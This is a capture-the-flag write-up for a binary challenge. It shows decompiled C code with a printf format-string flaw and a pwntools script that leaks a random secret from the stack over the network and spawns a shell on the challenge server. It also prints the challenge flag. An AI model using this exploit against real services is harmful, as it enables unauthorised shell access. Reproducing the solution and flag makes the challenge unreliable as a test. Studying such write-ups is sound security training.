# under-attack: pwn / reverse

Flag Proof: `CTF{09aea10d4ab225782586c58698e41c6599c721ec4928ce6a38203ba32ca80507}`

## Summary:

- Opening the binary in `ghidra`:

```c
fd = open("/dev/urandom",0);
  if (fd == -1) {
    puts("Open failed");
    iVar1 = -1;
  }
  else {
    sVar2 = read(fd,&flag,4);
    if (sVar2 == 4) {
      close(fd);
      puts("We are under attack, We need to extract the secret password from system!");
      fflush(stdout);
      fgets(buffer,0x400,stdin);
      printf(buffer);
      printf("Please insert the password: ");
      fflush(stdout);
      __isoc99_scanf(&DAT_00400b86,&not_flag);
      if (flag == not_flag) {
        puts("You are the one who attack the infrastructure now!");
        system("/bin/sh");
      }
      else {
        puts("Permission denied!\n");
      }
```

- There we can see that it takes input from `/dev/urandom` and puts it into flag
- We have to provide the input to be the same as the value from `flag`
- Also we can see that `printf` is being used, which gives us the possibility of leaking the stack, and the value we need is somewhere on the stack. I chose the easier way of doing it, and just trying `%p` values till it gets the right one

```python
from pwn import *

context.log_level = 'error'

for i in range (0,100):
    p = remote('34.159.78.10',30505)
    p.recv()
    payload = "%{}$p".format(i)
    p.sendline(payload.encode())

    urandom = p.recv().decode()[2:10]

    p.sendline(urandom)
    if b'You' in p.recv():
        p.interactive()
```

- Running it , and we get a shell on the box

![Untitled](under-attack%20pwn%20reverse%2005294892f5944d0ca587c349e22c7eff/Untitled.png)